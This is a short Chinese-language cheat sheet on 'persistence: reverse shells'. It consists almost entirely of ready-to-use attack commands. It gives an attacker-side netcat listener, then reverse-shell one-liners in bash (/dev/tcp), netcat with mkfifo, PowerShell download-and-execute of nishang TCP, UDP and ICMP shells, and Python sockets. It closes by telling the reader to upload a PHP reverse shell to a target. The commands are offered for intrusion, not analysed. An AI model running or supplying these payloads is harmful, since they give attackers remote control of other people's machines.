---
title: 【权限维持】反弹shell
---
## 反弹shell
## 攻击者VPS监听

```bash
nc -lvp 9999
```

## BASH

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.1.1/9999 <&1'
```

## Netcat

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.1.1.1 9999 >/tmp/f	##非交互
```

## PowerShell

将ps1脚本先放到VPS上

```powershell
##TCP
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.1.1.1 -port 9999

##UDP
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress 10.1.1.1 -port 53

##ICMP
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.159.134
```

## Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP

https://github.com/pentestmonkey/php-reverse-shell

PHP 交互式反弹Shell，修改反弹IP后上传到目标访问一下即可。